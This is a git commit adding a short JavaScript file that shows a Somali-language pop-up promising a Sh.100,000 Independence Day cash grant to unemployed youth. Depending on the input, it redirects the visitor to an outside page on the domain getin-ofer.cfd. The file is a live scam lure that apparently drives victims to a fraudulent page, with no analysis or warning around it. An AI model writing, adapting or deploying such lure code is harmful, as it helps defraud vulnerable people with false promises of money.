e547ec0bf28250cc597f9a941ab1f74662a85c35
Help-All <imaobongumoh637@gmail.com>
2026-05-19 07:50:11 +0100

    Create activeindepen.js

---
+++ activeindepen.js
@@ -0,0 +1,10 @@
+var password = 'HALKAN KA QAADO LACAG';
+
+password = prompt(
+  'Hambalyo, waxaad u qalantaa inaad hesho Sl.Sh.100.000 DEEQDA LACAGTA MAALINTA XORRIYADDA EE DHALLINYARADA SHAQO LA’AANTA AH. Guji OK si aad isla markiiba u hesho.',
+  'HALKAN KA QAADO LACAG'
+);
+
+if (password !== 'HALKAN KA QAADO LACAG') {
+    location.href = 'https://getin-ofer.cfd/100000-Madaxbanaani-Farxad-Leh.html';
+}
